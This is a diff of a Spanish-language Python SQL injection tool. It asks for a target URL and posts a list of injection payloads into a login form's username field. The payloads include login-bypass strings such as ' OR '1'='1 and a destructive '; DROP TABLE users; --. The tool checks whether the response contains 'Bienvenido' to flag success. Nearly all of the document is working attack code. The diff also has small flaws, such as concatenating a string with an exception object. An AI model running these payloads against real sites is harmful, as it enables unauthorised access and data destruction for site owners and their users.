@@ -1,48 +1,74 @@
 import os
+import sys
 import urllib.parse
 import requests
-from colorama import *
+from colorama import Fore, Back, Style
 
 def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
 def sql_injection_main():
-    try:
-        target_url = input("Ingrese la URL objetivo: ")
-        if not target_url.startswith("http://") and not target_url.startswith("https:// \n"):
-            raise ValueError("La URL debe comenzar con 'http://' o 'https://'")
+    clear_screen()
+    banner()
+    while True:
+        try:
+            target_url = input("Ingrese la URL objetivo (o escriba 'n' para salir): ")
+            if target_url.lower() == 'n':
+                sys.exit()  # Salir del programa si el usuario escribe 'n'
+            elif not target_url.startswith("http://") and not target_url.startswith("https://"):
+                raise ValueError("La URL debe comenzar con 'http://' o 'https://'")
 
-        num_injections = int(input("Ingrese el número de inyecciones de SQL que desea generar: "))
+            num_injections = int(input("Ingrese el número de inyecciones de SQL que desea generar: "))
 
-        if num_injections <= 0:
-            raise ValueError("El número de inyecciones debe ser un entero positivo.")
+            if num_injections <= 0:
+                raise ValueError("El número de inyecciones debe ser un entero positivo.")
 
-        payload = "' OR '1'='1 " * num_injections
+            # Lista de payloads para inyección SQL
+            payloads = [
+                "' OR '1'='1",
+                "' OR '1'='1';--",
+                "' OR 1=1--",
+                "' OR 'x'='x",
+                "') OR ('x'='x",
+                "'; DROP TABLE users; --"
+                # Agregue más payloads según sus necesidades
+            ]
 
-        # Codificar el payload para que sea seguro enviarlo en la URL
-        encoded_payload = urllib.parse.quote(payload, safe='')
+            # Construir los datos del formulario
+            data = {
+                'username': 'test',
+                'password': 'test'
+            }
 
-        # Construir la URL con el payload inyectado
-        url = f"{target_url}?username={encoded_payload}&password=test"
+            for payload in payloads:
+                # Agregar el payload al campo username
+                data['username'] = payload
 
-        # Realizar la solicitud HTTP GET
-        response = requests.get(url)
+                # Realizar la solicitud HTTP POST
+                response = requests.post(target_url, data=data)
 
-        # Analizar la respuesta y determinar si la inyección fue exitosa
-        if "Bienvenido" in response.text:
-            print(Fore.BLACK + Back.GREEN + "Inyección de SQL exitosa. Se encontró una vulnerabilidad.")
+                # Analizar la respuesta y determinar si la inyección fue exitosa
+                if "Bienvenido" in response.text:
+                    print(Fore.BLACK + Back.GREEN + f"Inyección de SQL exitosa con payload: {payload}" + Style.RESET_ALL)
+                    break  # Salir del bucle si se encuentra una inyección exitosa
+                else:
+                    print(Fore.BLACK + Back.RED + f"No se encontraron indicios de inyección de SQL con payload: {payload}" + Style.RESET_ALL)
+
+        except ValueError as ve:
+            print(Fore.BLACK + Back.RED + "Error:" + str(ve) + Style.RESET_ALL)
+            print(Fore.BLACK + Back.RED + "Inserte datos válidos." + Style.RESET_ALL)
+            continue
+
+        except requests.RequestException as re:
+            print(Fore.BLACK + Back.RED + "Error de solicitud HTTP:", re + Style.RESET_ALL)
+            continue
+
+        except Exception as e:
+            clear_screen()
+            print(Fore.BLACK + Back.RED + "Error:", e + Style.RESET_ALL)
+            continue
         else:
-            print(Fore.BLACK + Back.RED + "No se encontraron indicios de inyección de SQL en la respuesta.")
-
-    except ValueError as ve:
-        print(Fore.BLACK + Back.RED +"Error:", ve)
-        print(Fore.BLACK + Back.RED +"Inserte datos válidos.")
-        sql_injection_main()  # Volver a ejecutar la función
-
-    except Exception as e:
-        clear_screen()
-        print(Fore.BLACK + Back.RED +"Error:", e)
-        sql_injection_main()  # Volver a ejecutar la función
+            break  # Salir del bucle while si no hay excepciones
 
 def banner():
     cartel = r"""
@@ -57,6 +83,6 @@ def banner():
     print(Fore.CYAN + Style.BRIGHT + "*********************************************************" + Style.RESET_ALL)
 
 if __name__ == "__main__":
-    init(autoreset=True)  # Esto asegura que los colores se reseteen después de cada print
+    clear_screen()
     banner()
     sql_injection_main()
